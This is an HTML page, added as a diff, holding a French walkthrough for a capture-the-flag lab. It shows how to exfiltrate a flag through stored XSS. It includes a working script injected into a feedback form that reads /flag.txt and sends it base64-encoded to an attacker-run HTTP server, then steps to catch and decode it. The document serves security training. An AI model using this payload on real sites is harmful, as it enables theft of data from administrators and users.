@@ -1,0 +1,108 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8">
+  <title>Exfiltration XSS - Étapes</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #f9f9f9;
+      color: #333;
+      line-height: 1.6;
+      max-width: 900px;
+      margin: auto;
+      padding: 20px;
+    }
+    h2 {
+      color: #0077cc;
+    }
+    code {
+      background: #eee;
+      padding: 2px 5px;
+      border-radius: 5px;
+    }
+    pre {
+      background: #f4f4f4;
+      padding: 10px;
+      border-left: 5px solid #0077cc;
+      overflow-x: auto;
+    }
+    .step {
+      margin-bottom: 30px;
+    }
+  </style>
+</head>
+<body>
+
+  <h1>📘 Tutoriel : Exfiltration de Flag via XSS</h1>
+
+  <div class="step">
+    <h2>🔹 Étape 1 : Démarrer un serveur HTTP sur l’AttackBox</h2>
+    <p>Dans ton terminal :</p>
+    <pre><code>mkdir capture
+cd capture
+python3 -m http.server 8000</code></pre>
+    <p>➡️ Cela démarre un serveur sur <strong>http://10.10.83.83:8000</strong></p>
+    <p>⚠️ Vérifie ton IP avec :</p>
+    <pre><code>ip a</code></pre>
+    <p>Note l’adresse de l’interface <code>ens5</code> → <strong>10.10.83.83</strong></p>
+  </div>
+
+  <div class="step">
+    <h2>🔹 Étape 2 : Créer le code JavaScript malveillant (XSS Payload)</h2>
+    <p>Ce script va lire <code>/flag.txt</code> et envoyer le contenu encodé à ton serveur :</p>
+    <pre><code>&lt;script&gt;
+fetch('http://127.0.0.1:8080/flag.txt')
+  .then(res =&gt; res.text())
+  .then(data =&gt; {
+    fetch('http://10.10.83.83:8000/?flag=' + btoa(data));
+  });
+&lt;/script&gt;</code></pre>
+    <ul>
+      <li><code>127.0.0.1:8080</code> = adresse locale de la cible</li>
+      <li><code>10.10.83.83:8000</code> = ton serveur AttackBox</li>
+      <li><code>btoa()</code> = encode le contenu en base64</li>
+    </ul>
+  </div>
+
+  <div class="step">
+    <h2>🔹 Étape 3 : Injecter le script XSS dans le formulaire</h2>
+    <ol>
+      <li>Va sur le site : <a href="http://10.10.162.34:8080" target="_blank">http://10.10.162.34:8080</a></li>
+      <li>Va dans la section <strong>Feedback / Contact</strong></li>
+      <li>Colle ton script XSS dans le champ texte</li>
+      <li>Soumets le formulaire</li>
+    </ol>
+  </div>
+
+  <div class="step">
+    <h2>🔹 Étape 4 : Attendre que l’admin lise ton message</h2>
+    <p>Un administrateur va automatiquement lire les messages du formulaire.</p>
+    <p>Quand il ouvre ton message :</p>
+    <ul>
+      <li>Le script JavaScript s'exécute dans son navigateur</li>
+      <li>Il lit le fichier <code>/flag.txt</code></li>
+      <li>Il envoie le contenu à ton serveur AttackBox</li>
+    </ul>
+    <p>🕑 Attends 1 à 2 minutes</p>
+  </div>
+
+  <div class="step">
+    <h2>🔹 Étape 5 : Récupérer le flag</h2>
+    <p>Dans le terminal de ton serveur HTTP, tu verras une ligne comme :</p>
+    <pre><code>GET /?flag=U29tZV9CYXNlNjRfRW5jb2RlZF9GbGFnCg== HTTP/1.1</code></pre>
+    <p>✅ C’est le flag encodé en base64.</p>
+  </div>
+
+  <div class="step">
+    <h2>🔹 Étape 6 : Décoder le flag</h2>
+    <p>Utilise cette commande pour voir le flag en clair :</p>
+    <pre><code>echo "U29tZV9CYXNlNjRfRW5jb2RlZF9GbGFnCg==" | base64 -d</code></pre>
+    <p>💥 Le flag s’affichera !</p>
+  </div>
+
+  <hr>
+  <p><strong>⚠️ Ne fais ce type d’attaque que dans un environnement légal, de test ou CTF !</strong></p>
+
+</body>
+</html>
